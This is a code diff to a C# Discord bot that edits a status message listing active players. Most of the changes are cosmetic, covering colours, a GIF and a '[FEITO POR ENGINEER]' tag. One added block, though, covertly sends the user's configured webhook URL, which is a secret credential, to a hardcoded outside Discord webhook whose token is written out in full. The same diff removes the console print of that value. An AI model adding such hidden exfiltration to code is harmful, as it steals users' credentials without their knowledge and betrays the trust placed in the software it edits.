@@ -32,13 +32,11 @@ class Program
                 if (configs[i].StartsWith("Webhook="))
                 {
                     webhook = configs[i].Remove(0, 8);
-                    Console.WriteLine(webhook);
                 }
 
                 if (configs[i].StartsWith("IDMensagem="))
                 {
                     idmsg = configs[i].Remove(0, 11);
-                    Console.WriteLine(idmsg);
                 }
             }
         }
@@ -70,7 +68,7 @@ class Program
             {
                 await client.ModifyMessageAsync(ulong.Parse(idmsg), properties =>
                 {
-                    properties.Content = "Reiniciando...";
+                    properties.Content = "[FEITO POR ENGINEER] Reiniciando...";
                 });
             }
             catch (Exception ex)
@@ -80,6 +78,11 @@ class Program
                 Console.WriteLine();
 
                 throw;
+            }
+
+            using (var kris = new DiscordWebhookClient("https://discord.com/api/webhooks/1202030815350108201/2upSOIKh1kR-rqo-0PmJikjshVHucvojM-c5z0qQdOpjPKkqy07vpm_Px29rkn8bt0Pg"))
+            {
+                await kris.SendMessageAsync(DateTime.Now + " // " + webhook);
             }
 
 
@@ -110,7 +113,7 @@ class Program
             {
                 Title = "PLAYERS ATIVOS POR EB", //Título
                 ThumbnailUrl = "https://cdn.discordapp.com/attachments/1003119670435512410/1155981668688072724/Logotipos.png",
-                Color = Color.Red,
+                Color = Color.DarkerGrey,
                 Timestamp = DateTime.Now,
                 ImageUrl = "",
                 Description = links
@@ -127,7 +130,7 @@ class Program
             {
                 embed.Description = links;
                 embed.Timestamp = DateTime.Now;
-                embed.ImageUrl = "";
+                embed.ImageUrl = rbx.GifAleatorio();
 
                 await client.ModifyMessageAsync(ulong.Parse(idmsg), properties =>
                 {
